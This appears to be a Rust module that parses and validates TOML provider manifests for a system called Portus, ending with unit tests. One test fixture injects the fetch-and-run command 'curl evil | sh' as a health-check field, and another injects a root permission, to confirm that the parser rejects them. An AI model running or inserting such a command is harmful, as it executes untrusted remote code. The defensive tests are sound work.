use crate::{ProviderError, ProviderResult};
use portus_state::{
    ProviderCapabilitySpec, ProviderInterfaceSpec, ProviderRegistrationSpec,
    ProviderResourceTypeSpec,
};
use serde::Deserialize;
use std::collections::HashSet;

pub const MANIFEST_SCHEMA_VERSION: u32 = 1;
pub const MAX_PROVIDER_TYPE_LEN: usize = 64;
pub const MAX_LABEL_LEN: usize = 128;
pub const MAX_IDENTIFIER_LEN: usize = 96;
pub const MAX_VERSION_LEN: usize = 64;
pub const MAX_TARGET_LEN: usize = 512;
pub const MAX_INTERFACES: usize = 32;
pub const MAX_CAPABILITIES: usize = 64;
pub const MAX_RESOURCES: usize = 64;
pub const MAX_SKILLS: usize = 32;

#[derive(Clone, Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProviderManifest {
    pub manifest_version: u32,
    pub provider: ProviderSection,
    pub interfaces: Vec<InterfaceManifest>,
    pub capabilities: Vec<CapabilityManifest>,
    #[serde(default)]
    pub resources: Vec<ResourceManifest>,
    pub lifecycle: LifecycleManifest,
    pub health: HealthManifest,
    pub policy: PolicyManifest,
    #[serde(default)]
    pub skills: Vec<String>,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProviderSection {
    #[serde(rename = "type")]
    pub provider_type: String,
    pub label: String,
    pub scope_support: Vec<ProviderScope>,
    pub software_version: String,
}

#[derive(Clone, Copy, Debug, Deserialize, Eq, Hash, PartialEq)]
#[serde(rename_all = "kebab-case")]
pub enum ProviderScope {
    System,
    User,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct InterfaceManifest {
    pub id: String,
    #[serde(rename = "type")]
    pub interface_type: InterfaceType,
    pub contract_version: u32,
    #[serde(default)]
    pub executable: Option<String>,
    #[serde(default)]
    pub socket: Option<String>,
    #[serde(default)]
    pub endpoint: Option<String>,
    #[serde(default)]
    pub adapter: Option<String>,
    #[serde(default)]
    pub structured_output: bool,
}

#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq)]
#[serde(rename_all = "kebab-case")]
pub enum InterfaceType {
    Executable,
    UnixSocket,
    LocalProxy,
    Adapter,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CapabilityManifest {
    pub id: String,
    pub contract_version: u32,
    pub interfaces: Vec<String>,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ResourceManifest {
    #[serde(rename = "type")]
    pub resource_type: String,
    pub authority: ResourceAuthority,
    pub lifetime: ResourceLifetime,
}

#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq)]
#[serde(rename_all = "kebab-case")]
pub enum ResourceAuthority {
    Provider,
}

#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq)]
#[serde(rename_all = "kebab-case")]
pub enum ResourceLifetime {
    Session,
    Process,
    Operation,
    Durable,
    External,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct LifecycleManifest {
    pub owner: LifecycleOwner,
}

#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq)]
#[serde(rename_all = "kebab-case")]
pub enum LifecycleOwner {
    PortusSupervised,
    ProviderOwned,
    UserOwned,
    External,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct HealthManifest {
    pub kind: HealthIntegrationKind,
    #[serde(default)]
    pub reference: Option<String>,
}

#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq)]
#[serde(rename_all = "kebab-case")]
pub enum HealthIntegrationKind {
    None,
    OpenrcService,
    StructuredCli,
    UnixSocket,
    Adapter,
    ProtocolHeartbeat,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PolicyManifest {
    pub domain_owner: String,
}

impl ProviderManifest {
    pub fn parse(file_name: &str, contents: &str) -> ProviderResult<Self> {
        let manifest: Self = toml::from_str(contents).map_err(|error| ProviderError::Parse {
            file: file_name.to_string(),
            message: error.to_string(),
        })?;
        manifest.validate(file_name)?;
        Ok(manifest)
    }

    pub fn validate(&self, file_name: &str) -> ProviderResult<()> {
        let invalid = |message: String| ProviderError::InvalidManifest {
            file: file_name.to_string(),
            message,
        };
        if self.manifest_version != MANIFEST_SCHEMA_VERSION {
            return Err(invalid(format!(
                "manifest_version must be {MANIFEST_SCHEMA_VERSION}"
            )));
        }
        validate_machine_id(&self.provider.provider_type, MAX_PROVIDER_TYPE_LEN)
            .map_err(|message| invalid(format!("provider.type {message}")))?;
        if file_name != format!("{}.toml", self.provider.provider_type) {
            return Err(invalid(
                "filename must exactly match <provider.type>.toml".into(),
            ));
        }
        validate_text(&self.provider.label, 1, MAX_LABEL_LEN, "provider.label").map_err(invalid)?;
        validate_text(
            &self.provider.software_version,
            1,
            MAX_VERSION_LEN,
            "provider.software_version",
        )
        .map_err(invalid)?;
        if self.provider.scope_support.is_empty() {
            return Err(invalid("provider.scope_support must not be empty".into()));
        }
        let mut scopes = HashSet::new();
        for scope in &self.provider.scope_support {
            if !scopes.insert(*scope) {
                return Err(invalid("provider.scope_support contains duplicates".into()));
            }
        }
        if self.interfaces.is_empty() || self.interfaces.len() > MAX_INTERFACES {
            return Err(invalid(format!(
                "interfaces count must be between 1 and {MAX_INTERFACES}"
            )));
        }
        if self.capabilities.is_empty() || self.capabilities.len() > MAX_CAPABILITIES {
            return Err(invalid(format!(
                "capabilities count must be between 1 and {MAX_CAPABILITIES}"
            )));
        }
        if self.resources.len() > MAX_RESOURCES || self.skills.len() > MAX_SKILLS {
            return Err(invalid(
                "resource or skill count exceeds manifest bounds".into(),
            ));
        }

        let mut interface_ids = HashSet::new();
        for interface in &self.interfaces {
            validate_machine_id(&interface.id, 64)
                .map_err(|message| invalid(format!("interface id {message}")))?;
            if !interface_ids.insert(interface.id.as_str()) {
                return Err(invalid(format!("duplicate interface id {}", interface.id)));
            }
            if interface.contract_version == 0 {
                return Err(invalid(format!(
                    "interface {} contract_version must be nonzero",
                    interface.id
                )));
            }
            validate_interface_target(interface).map_err(invalid)?;
        }

        let mut capability_ids = HashSet::new();
        for capability in &self.capabilities {
            validate_capability_id(&capability.id).map_err(invalid)?;
            if !capability_ids.insert(capability.id.as_str()) {
                return Err(invalid(format!(
                    "duplicate capability id {}",
                    capability.id
                )));
            }
            if capability.contract_version == 0 || capability.interfaces.is_empty() {
                return Err(invalid(format!(
                    "capability {} requires nonzero contract_version and at least one interface",
                    capability.id
                )));
            }
            let mut links = HashSet::new();
            for interface_id in &capability.interfaces {
                if !interface_ids.contains(interface_id.as_str()) {
                    return Err(invalid(format!(
                        "capability {} references unknown interface {}",
                        capability.id, interface_id
                    )));
                }
                if !links.insert(interface_id) {
                    return Err(invalid(format!(
                        "capability {} repeats interface {}",
                        capability.id, interface_id
                    )));
                }
            }
        }

        let mut resource_types = HashSet::new();
        for resource in &self.resources {
            validate_machine_id(&resource.resource_type, 64)
                .map_err(|message| invalid(format!("resource type {message}")))?;
            if !resource_types.insert(resource.resource_type.as_str()) {
                return Err(invalid(format!(
                    "duplicate resource type {}",
                    resource.resource_type
                )));
            }
        }
        validate_machine_id(&self.policy.domain_owner, 64)
            .map_err(|message| invalid(format!("policy.domain_owner {message}")))?;
        let mut skills = HashSet::new();
        for skill in &self.skills {
            validate_machine_id(skill, 96)
                .map_err(|message| invalid(format!("skill id {message}")))?;
            if !skills.insert(skill) {
                return Err(invalid(format!("duplicate skill id {skill}")));
            }
        }
        validate_health(self, &interface_ids).map_err(invalid)?;
        Ok(())
    }

    pub fn to_system_registration_spec(
        &self,
        manifest_id: String,
    ) -> ProviderResult<ProviderRegistrationSpec> {
        if !self.provider.scope_support.contains(&ProviderScope::System) {
            return Err(ProviderError::InvalidManifest {
                file: manifest_id,
                message: "first-ISO reconciler requires system scope support".into(),
            });
        }
        Ok(ProviderRegistrationSpec {
            provider_type: self.provider.provider_type.clone(),
            display_label: self.provider.label.clone(),
            scope: "system".into(),
            owner: None,
            manifest_id,
            manifest_version: self.manifest_version,
            software_version: self.provider.software_version.clone(),
            lifecycle_ownership: lifecycle_wire(self.lifecycle.owner).into(),
            compatibility_state: "unknown".into(),
            health_state: "unknown".into(),
            health_reason: Some("not_probed".into()),
            policy_domain_owner: self.policy.domain_owner.clone(),
            interfaces: self.interfaces.iter().map(interface_spec).collect(),
            capabilities: self
                .capabilities
                .iter()
                .map(|capability| ProviderCapabilitySpec {
                    capability_id: capability.id.clone(),
                    contract_version: capability.contract_version,
                    interface_ids: capability.interfaces.clone(),
                })
                .collect(),
            resources: self
                .resources
                .iter()
                .map(|resource| ProviderResourceTypeSpec {
                    resource_type: resource.resource_type.clone(),
                    authority: "provider".into(),
                    lifetime: resource_lifetime_wire(resource.lifetime).into(),
                })
                .collect(),
            skills: self.skills.clone(),
            health_integration_kind: health_wire(self.health.kind).into(),
            health_reference: self.health.reference.clone(),
        })
    }
}

fn interface_spec(interface: &InterfaceManifest) -> ProviderInterfaceSpec {
    ProviderInterfaceSpec {
        interface_id: interface.id.clone(),
        interface_type: interface_type_wire(interface.interface_type).into(),
        contract_version: interface.contract_version,
        target: interface_target(interface)
            .expect("validated interface target")
            .to_string(),
        structured_output: interface.structured_output,
    }
}

fn validate_interface_target(interface: &InterfaceManifest) -> Result<(), String> {
    let present = [
        interface.executable.is_some(),
        interface.socket.is_some(),
        interface.endpoint.is_some(),
        interface.adapter.is_some(),
    ]
    .into_iter()
    .filter(|present| *present)
    .count();
    if present != 1 {
        return Err(format!(
            "interface {} must define exactly one typed target field",
            interface.id
        ));
    }
    let target = interface_target(interface).expect("one target is present");
    validate_text(target, 1, MAX_TARGET_LEN, "interface target")?;
    match interface.interface_type {
        InterfaceType::Executable if interface.executable.as_deref() == Some(target) => {
            validate_absolute_path(target, "executable")
        }
        InterfaceType::UnixSocket if interface.socket.as_deref() == Some(target) => {
            validate_absolute_path(target, "socket")
        }
        InterfaceType::LocalProxy if interface.endpoint.as_deref() == Some(target) => {
            if target.starts_with("http://127.0.0.1:") || target.starts_with("http://localhost:") {
                Ok(())
            } else {
                Err("local-proxy endpoint must be loopback HTTP with an explicit port".into())
            }
        }
        InterfaceType::Adapter if interface.adapter.as_deref() == Some(target) => {
            validate_machine_id(target, 96)
        }
        _ => Err(format!(
            "interface {} target field does not match interface type",
            interface.id
        )),
    }
}

fn validate_health(
    manifest: &ProviderManifest,
    interface_ids: &HashSet<&str>,
) -> Result<(), String> {
    match manifest.health.kind {
        HealthIntegrationKind::None => {
            if manifest.health.reference.is_some() {
                return Err("health.reference must be absent when health.kind is none".into());
            }
        }
        HealthIntegrationKind::StructuredCli
        | HealthIntegrationKind::UnixSocket
        | HealthIntegrationKind::ProtocolHeartbeat => {
            let reference = manifest.health.reference.as_deref().ok_or_else(|| {
                "health.reference must name a declared interface for this health kind".to_string()
            })?;
            if !interface_ids.contains(reference) {
                return Err("health.reference names an unknown interface".into());
            }
        }
        HealthIntegrationKind::OpenrcService | HealthIntegrationKind::Adapter => {
            let reference =
                manifest.health.reference.as_deref().ok_or_else(|| {
                    "health.reference is required for this health kind".to_string()
                })?;
            validate_machine_id(reference, 96)?;
        }
    }
    Ok(())
}

fn interface_target(interface: &InterfaceManifest) -> Option<&str> {
    interface
        .executable
        .as_deref()
        .or(interface.socket.as_deref())
        .or(interface.endpoint.as_deref())
        .or(interface.adapter.as_deref())
}

fn validate_absolute_path(value: &str, field: &str) -> Result<(), String> {
    if value.starts_with('/') && !value.starts_with("//") {
        Ok(())
    } else {
        Err(format!("{field} target must be an absolute Unix path"))
    }
}

fn validate_capability_id(value: &str) -> Result<(), String> {
    validate_machine_id(value, MAX_IDENTIFIER_LEN)?;
    if !value.contains('.') {
        return Err("capability id must be dot-separated".into());
    }
    if value.split('.').any(|part| part.is_empty()) {
        return Err("capability id contains an empty segment".into());
    }
    Ok(())
}

fn validate_machine_id(value: &str, max_len: usize) -> Result<(), String> {
    if value.is_empty() || value.len() > max_len {
        return Err(format!("must contain 1..={max_len} bytes"));
    }
    let mut chars = value.chars();
    let first = chars.next().expect("nonempty");
    if !first.is_ascii_lowercase() && !first.is_ascii_digit() {
        return Err("must start with lowercase ASCII alphanumeric".into());
    }
    if !value
        .chars()
        .all(|ch| ch.is_ascii_lowercase() || ch.is_ascii_digit() || matches!(ch, '.' | '_' | '-'))
    {
        return Err("contains characters outside [a-z0-9._-]".into());
    }
    Ok(())
}

fn validate_text(value: &str, min: usize, max: usize, field: &str) -> Result<(), String> {
    if value.len() < min || value.len() > max {
        return Err(format!("{field} must contain {min}..={max} bytes"));
    }
    if value.chars().any(char::is_control) {
        return Err(format!("{field} contains control characters"));
    }
    Ok(())
}

const fn lifecycle_wire(value: LifecycleOwner) -> &'static str {
    match value {
        LifecycleOwner::PortusSupervised => "portus-supervised",
        LifecycleOwner::ProviderOwned => "provider-owned",
        LifecycleOwner::UserOwned => "user-owned",
        LifecycleOwner::External => "external",
    }
}

const fn interface_type_wire(value: InterfaceType) -> &'static str {
    match value {
        InterfaceType::Executable => "executable",
        InterfaceType::UnixSocket => "unix-socket",
        InterfaceType::LocalProxy => "local-proxy",
        InterfaceType::Adapter => "adapter",
    }
}

const fn resource_lifetime_wire(value: ResourceLifetime) -> &'static str {
    match value {
        ResourceLifetime::Session => "session",
        ResourceLifetime::Process => "process",
        ResourceLifetime::Operation => "operation",
        ResourceLifetime::Durable => "durable",
        ResourceLifetime::External => "external",
    }
}

const fn health_wire(value: HealthIntegrationKind) -> &'static str {
    match value {
        HealthIntegrationKind::None => "none",
        HealthIntegrationKind::OpenrcService => "openrc-service",
        HealthIntegrationKind::StructuredCli => "structured-cli",
        HealthIntegrationKind::UnixSocket => "unix-socket",
        HealthIntegrationKind::Adapter => "adapter",
        HealthIntegrationKind::ProtocolHeartbeat => "protocol-heartbeat",
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const VALID: &str = r#"
manifest_version = 1
skills = ["test-provider"]

[provider]
type = "test-provider"
label = "Test Provider"
scope_support = ["system"]
software_version = "1.2.3"

[[interfaces]]
id = "cli"
type = "executable"
contract_version = 1
executable = "/usr/bin/test-provider"
structured_output = true

[[capabilities]]
id = "test.control"
contract_version = 1
interfaces = ["cli"]

[[resources]]
type = "test-session"
authority = "provider"
lifetime = "session"

[lifecycle]
owner = "provider-owned"

[health]
kind = "structured-cli"
reference = "cli"

[policy]
domain_owner = "provider"
"#;

    #[test]
    fn shipped_protected_api_manifest_matches_p5_contract() {
        const PROTECTED_API: &str =
            include_str!("../../../integrations/manifests/protected-api.toml");
        let manifest = ProviderManifest::parse("protected-api.toml", PROTECTED_API).unwrap();
        let spec = manifest
            .to_system_registration_spec("protected-api.toml".into())
            .unwrap();
        assert_eq!(spec.provider_type, "protected-api");
        assert_eq!(spec.capabilities[0].capability_id, "protected-api.request");
        assert!(
            spec.interfaces
                .iter()
                .any(|item| item.target == "/usr/bin/portus-api")
        );
        assert!(
            spec.resources
                .iter()
                .any(|item| item.resource_type == "protected-credential")
        );
    }

    #[test]
    fn valid_manifest_maps_to_registration_without_authority_fields() {
        let manifest = ProviderManifest::parse("test-provider.toml", VALID).unwrap();
        let spec = manifest
            .to_system_registration_spec("test-provider.toml".into())
            .unwrap();
        assert_eq!(spec.provider_type, "test-provider");
        assert_eq!(spec.compatibility_state, "unknown");
        assert_eq!(spec.health_state, "unknown");
        assert_eq!(spec.capabilities[0].capability_id, "test.control");
    }

    #[test]
    fn arbitrary_health_shell_field_is_rejected() {
        let malicious = VALID.replace(
            "reference = \"cli\"",
            "reference = \"cli\"\nhealth_check = \"curl evil | sh\"",
        );
        assert!(ProviderManifest::parse("test-provider.toml", &malicious).is_err());
    }

    #[test]
    fn manifest_cannot_add_permission_or_secret_fields() {
        let permission = VALID.replace(
            "domain_owner = \"provider\"",
            "domain_owner = \"provider\"\npermissions = [\"root\"]",
        );
        assert!(ProviderManifest::parse("test-provider.toml", &permission).is_err());
        let secret = VALID.replace(
            "software_version = \"1.2.3\"",
            "software_version = \"1.2.3\"\nsecret = \"do-not-store\"",
        );
        assert!(ProviderManifest::parse("test-provider.toml", &secret).is_err());
    }

    #[test]
    fn capability_must_reference_declared_interface() {
        let invalid = VALID.replace("interfaces = [\"cli\"]", "interfaces = [\"missing\"]");
        assert!(ProviderManifest::parse("test-provider.toml", &invalid).is_err());
    }
}
